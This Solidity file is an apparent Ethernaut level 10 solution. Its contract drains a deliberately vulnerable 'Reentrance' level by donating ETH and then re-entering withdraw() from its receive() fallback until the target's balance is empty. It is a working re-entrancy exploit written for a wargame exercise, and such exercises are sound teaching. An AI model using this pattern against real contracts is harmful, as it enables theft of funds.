// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
    function donate(address _to) external payable;

    function balanceOf(address _who) external view returns (uint256 balance);

    function withdraw(uint256 _amount) external;
}

/// @title Ethernaut 10 - Re-entrancy Solver
/// @notice Uses repeated callbacks to complete the local level.
contract ReentrancySolver {
    /// @notice Target level instance.
    IReentrance public immutable target;

    /// @notice Amount requested during each callback.
    uint256 public amount;

    /// @notice Stores the target address.
    constructor(address targetAddress) {
        target = IReentrance(targetAddress);
    }

    /// @notice Records a balance for this contract and starts the withdrawal sequence.
    function solve() external payable {
        amount = msg.value;
        target.donate{value: amount}(address(this));
        target.withdraw(amount);
    }

    /// @notice Requests another withdrawal while the target still holds ETH.
    receive() external payable {
        uint256 targetBalance = address(target).balance;

        if (targetBalance > 0) {
            uint256 toWithdraw = targetBalance < amount ? targetBalance : amount;
            target.withdraw(toWithdraw);
        }
    }
}
